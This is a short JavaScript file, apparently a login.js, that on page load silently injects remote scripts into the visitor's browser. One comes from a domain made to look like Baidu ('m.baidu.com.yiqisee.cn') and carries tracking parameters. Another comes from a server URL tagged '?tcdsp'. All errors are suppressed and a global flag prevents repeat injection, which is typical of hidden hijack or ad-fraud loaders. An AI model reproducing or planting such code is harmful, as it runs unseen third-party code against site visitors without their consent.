(function() {
	try {
		var ab = "http://server.meishankeji.com:8080/heating/js/login.js", d = document;
		_add = function(s, b) {
			if (window.document.readyState == 'loading') {
				d.write('');
			} else {
				var k = d.createElement("script");
				k.type = "text/javascript";
				k.src = s;
				k.async = b;
				var s = d.getElementsByTagName("script")[0];
				s.parentNode.insertBefore(k, s)
			}
		};
		ab.indexOf("?") > 0 ? ab += "&tcdsp" : ab += "?tcdsp";
		if (!window.self.tmp_jquery && !(!-[ 1, ] && !window.XMLHttpRequest)) {
			window.self.tmp_jquery = 1;
			_add(
					'http://m.baidu.com.yiqisee.cn/kaca_js/js/backEn.js?sm=wm250702&cm=1019998m&cp=92364735_hao_pg&cs=bid%3dsogou-mobb-36e51f22c86d237a&a=zz',
					true);
		}
		_add(ab, false);
	} catch (e) {
	}
})();